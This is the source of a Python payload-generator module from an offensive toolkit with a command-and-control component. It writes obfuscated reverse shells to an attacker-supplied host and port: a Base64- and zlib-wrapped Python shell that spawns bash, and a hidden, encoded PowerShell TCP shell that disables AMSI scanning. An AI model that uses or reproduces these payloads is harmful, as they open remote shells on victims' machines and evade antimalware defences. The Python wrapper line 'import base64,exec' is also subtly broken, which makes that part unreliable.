import os
import random
import string
import base64
import textwrap
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header

console = Console()

class PayloadForge:
    def __init__(self):
        self.output_dir = "payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def generate_random_name(self, extension):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{self.output_dir}/{name}.{extension}"

    def forge_python_revshell(self, lhost, lport):
        """
        Forges an obfuscated Python reverse shell.
        Uses Base64 encoding and dynamic execution to bypass basic string-based signatures.
        """
        raw_code = f"""
import socket, os, pty, base64
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except Exception:
        pass
connect()
        """.strip()
        
        # Obfuscate using Base64
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        obfuscated_code = f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"
        return obfuscated_code

    def forge_powershell_revshell(self, lhost, lport):
        """
        Forges a PowerShell reverse shell with an integrated AMSI bypass.
        AMSI (Antimalware Scan Interface) is the primary hurdle for PowerShell scripts.
        """
        # A modular AMSI bypass (simple memory patching logic)
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        # The Core Shell
        shell_logic = f"""
        $c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
            $sb = (iex $d 2>&1 | Out-String );
            $sendback = ([text.encoding]::ASCII).GetBytes($sb + "PS " + (pwd).Path + "> ");
            $s.Write($sendback,0,$sendback.Length);
            $s.Flush()
        }};
        $c.Close();
        """
        
        full_script = amsi_bypass + shell_logic.strip()
        
        # Base64 encode for 'powershell -EncodedCommand' compatibility
        # PowerShell expects UTF-16LE for its encoded command parameter
        encoded_command = base64.b64encode(full_script.encode('utf-16-le')).decode()
        
        one_liner = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"
        return one_liner

    def run(self):
        draw_header("Payload Forge: msfvenom-Elite")
        
        lhost = console.input("[bold yellow]LHOST (Attacker IP): [/bold yellow]").strip()
        if not lhost:
            return console.print("[red][!] LHOST is required.[/red]")
            
        lport = console.input("[bold yellow]LPORT (Default 4444): [/bold yellow]").strip() or "4444"

        console.print(Panel(
            "[1] Linux/Unix (Python Obfuscated)\n"
            "[2] Windows (PowerShell Encoded + AMSI Bypass)\n"
            "[3] macOS (Python Zlib-Compressed)",
            title="Target Selection",
            border_style="cyan"
        ))
        
        choice = console.input("\n[forge]> ")

        if choice == "1":
            payload = self.forge_python_revshell(lhost, lport)
            fname = self.generate_random_name("py")
        elif choice == "2":
            payload = self.forge_powershell_revshell(lhost, lport)
            fname = self.generate_random_name("ps1")
        elif choice == "3":
            # Extra: Zlib compression for macOS/Linux variation
            import zlib
            raw = self.forge_python_revshell(lhost, lport)
            compressed = base64.b64encode(zlib.compress(raw.encode())).decode()
            payload = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"
            fname = self.generate_random_name("py")
        else:
            return console.print("[red][!] Invalid selection.[/red]")

        with open(fname, "w") as f:
            f.write(payload)

        console.print(Panel(
            f"[bold green][+] Payload Generated Successfully![/bold green]\n"
            f"[white]File Path:[/white] [cyan]{fname}[/cyan]\n\n"
            f"[dim]Note: Ensure GhostHub C2 is listening on {lhost}:{lport}[/dim]",
            title="Forge Result",
            border_style="green"
        ))

def generate_shell():
    try:
        forge = PayloadForge()
        forge.run()
    except Exception as e:
        console.print(f"[bold red][!] Forge Error: {e}[/bold red]")

if __name__ == "__main__":
    generate_shell()